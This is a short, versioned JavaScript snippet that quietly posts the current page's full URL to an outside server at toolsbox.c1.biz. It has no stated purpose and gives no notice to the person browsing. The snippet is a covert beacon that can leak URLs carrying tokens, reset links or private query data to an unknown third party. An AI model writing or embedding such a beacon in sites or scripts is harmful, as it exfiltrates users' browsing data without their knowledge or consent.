// V1.0.0

let formData = new FormData();
formData.append('tt', location.href);

fetch("http://toolsbox.c1.biz/api2.php",
    {
        body: formData,
        method: "post"
    });